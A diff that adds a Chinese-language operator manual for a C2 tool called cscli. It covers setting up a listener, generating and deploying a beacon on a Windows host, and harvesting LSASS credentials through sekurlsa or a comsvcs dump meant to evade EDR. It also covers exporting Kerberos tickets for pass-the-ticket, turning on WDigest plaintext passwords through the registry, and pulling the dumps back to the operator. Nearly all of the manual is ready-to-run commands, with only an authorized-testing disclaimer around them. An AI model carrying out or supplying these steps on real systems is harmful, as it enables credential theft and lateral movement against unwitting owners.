@@ -1,0 +1,159 @@
+================================================================================
+ cscli LSASS 凭据收割 操作手册
+ (仅限授权安全测试 / authorized security testing only)
+================================================================================
+
+目标:在授权的 Windows 测试机上,通过 beacon 提取 LSASS 内存中的凭据
+      (NTLM 哈希 / WDigest 明文 / Kerberos 票证)。
+
+前置条件(必须满足,否则失败):
+  - 目标机是 Windows
+  - beacon 以 管理员(Administrators 组)身份运行
+  - LSASS 未启用 PPL / Credential Guard(Win11 22H2+ 默认可能开启)
+  - Python 位数与系统一致(64 位系统用 64 位 Python)
+
+
+================================================================================
+ 第一步:启动团队服务器 + 监听器 (operator 端)
+================================================================================
+
+方式 A —— 交互式控制台:
+    python3 cscli
+    cscli> listener main 8080 0.0.0.0
+
+方式 B —— 非交互式 (HTTPS + 后台守护,推荐):
+    cscli --server --https --host 0.0.0.0 --port 443 --name main \
+          --cert server.crt --key server.key --password 连接口令 --background
+
+  # --password 是 beacon 连接口令(AES 密钥派生),后面生成 beacon 要一致
+
+
+================================================================================
+ 第二步:生成 beacon payload (operator 端)
+================================================================================
+
+标准 payload(纯 Python,stdlib-only,sekurlsa 不可用 —— 只能用 lsass dump):
+    cscli --payload --url https://你的服务器IP:443 --out beacon.py \
+          --password 连接口令 --no-verify
+
+PyInstaller 二进制(beacon.exe,sekurlsa 可用 —— 需在装了 pypykatz 的机器上编译):
+    pip install pypykatz
+    ./scripts/build-binary.sh windows64        # 注意:必须在 Windows 上编译
+    # 产出 dist/cscli-beacon.exe
+
+
+================================================================================
+ 第三步:部署并上线 beacon (目标 Windows 机,管理员权限)
+================================================================================
+
+    python beacon.py
+    # 或
+    cscli-beacon.exe https://你的服务器IP:443 --no-verify
+
+
+================================================================================
+ 第四步:确认会话上线 (operator 端)
+================================================================================
+
+    cscli --list
+    # 记下 <sid> (会话 ID)
+
+    # 交互式控制台里:
+    cscli> sessions
+    cscli> use <sid>
+
+
+================================================================================
+ 第五步:收割凭据 —— 两条路线二选一
+================================================================================
+
+------------------------------------------------------------------------------
+ 路线 A:sekurlsa 在线解析(不落盘,需 PyInstaller beacon / pypykatz)
+------------------------------------------------------------------------------
+
+  # 直接解析全部 SSP(msv/wdigest/kerberos/tspkg/ssp/livessp/dpapi/cloudap)
+  beacon[<sid>]> sekurlsa
+  # 或非交互式:
+  cscli --task <sid> "sekurlsa" --wait
+
+  # 只跑指定包
+  beacon[<sid>]> sekurlsa --pkgs msv,wdigest,kerberos
+
+  # 导出 Kerberos 票证(pass-the-ticket)
+  beacon[<sid>]> sekurlsa --export-dir C:\Windows\Temp\tk
+  beacon[<sid>]> sekurlsa --export-ccache C:\Windows\Temp\t.cc
+  # 然后把 .kirbi / .ccache 拉回操作端:
+  beacon[<sid>]> download C:\Windows\Temp\t.cc
+
+------------------------------------------------------------------------------
+ 路线 B:lsass dump 到文件,再离线解析(标准 payload 也能用)
+------------------------------------------------------------------------------
+
+  # dump LSASS 内存到文件(默认 comsvcs 方式,EDR 最难发现)
+  beacon[<sid>]> lsass C:\Windows\Temp\ls.dmp
+  # 或显式指定策略:
+  beacon[<sid>]> lsass C:\Windows\Temp\ls.dmp ctypes
+
+  # 拉回操作端
+  beacon[<sid>]> download C:\Windows\Temp\ls.dmp
+
+  # 操作端离线解析(需 pypykatz)
+  pip install pypykatz
+  cscli parse-lsass ls.dmp
+  # 或
+  python3 -m pypykatz lsadump ls.dmp
+
+
+================================================================================
+ 第六步(可选):开启 WDigest 明文存储,收割明文密码
+================================================================================
+
+  # 1. 先看当前状态
+  beacon[<sid>]> wdigest-status
+
+  # 2. 开启明文存储(写注册表 UseLogonCredential=1)
+  beacon[<sid>]> wdigest-enable
+
+  # 3. 等待用户重新登录 / 服务重新认证
+  #    (可配合锁屏、重启服务、或等自然登录)
+
+  # 4. 再次收割,wdigest 段会出现 Password 明文
+  beacon[<sid>]> sekurlsa
+
+  # 5. 用完后还原(设回 0)
+  beacon[<sid>]> wdigest-enable --disable
+
+
+================================================================================
+ 常用辅助命令
+================================================================================
+
+  beacon[<sid>]> whoami                 # 确认当前权限(应为 admin/SYSTEM)
+  beacon[<sid>]> sysinfo                # 系统信息(版本/架构)
+  beacon[<sid>]> shell whoami /priv     # 看 SeDebugPrivilege 是否启用
+  beacon[<sid>]> download <path>        # 下载文件到操作端
+  beacon[<sid>]> sleep 60 0.3           # 调心跳 60s + 30% jitter
+  beacon[<sid>]> disconnect             # 让 beacon 下线(服务端也清会话)
+
+
+================================================================================
+ 故障排查
+================================================================================
+
+  "only runs on Windows hosts"        -> 目标不是 Windows
+  "failed to enable SeDebugPrivilege" -> beacon 不是管理员
+  "OpenProcess failed" / access denied-> 非管理员 或 LSASS 是 PPL
+  "pypykatz not importable"           -> 标准 payload 不支持 sekurlsa,
+                                         改用路线 B(lsass dump)或 PyInstaller beacon
+  "no handler for xxx"                -> 旧版本连字符命令 bug,已修复,更新代码
+  sekurlsa 拿不到明文                  -> WDigest 未启用(见第六步)或没有新登录
+
+
+================================================================================
+ 法律与边界
+================================================================================
+
+  本工具仅限你拥有书面授权的系统。LSASS 转储 / sekurlsa 属高危操作
+  (ATT&CK T1003.001),未授权使用可能违法。操作产生的 .dmp / .kirbi /
+  ccache 含敏感凭据,请妥善保管并及时销毁。
+================================================================================
